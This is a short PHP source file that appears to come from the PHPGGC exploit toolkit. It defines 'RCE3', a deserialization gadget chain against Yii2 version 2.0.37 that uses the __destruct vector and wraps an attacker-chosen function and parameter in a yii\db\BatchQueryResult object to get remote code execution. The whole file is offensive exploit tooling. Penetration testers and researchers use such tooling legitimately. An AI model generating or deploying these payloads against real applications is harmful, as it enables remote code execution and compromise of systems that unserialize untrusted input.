<?php

namespace GadgetChain\Yii2;

class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.0.37';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        $query = new \yii\db\BatchQueryResult($function, $parameter);

        return $query;
    }
}

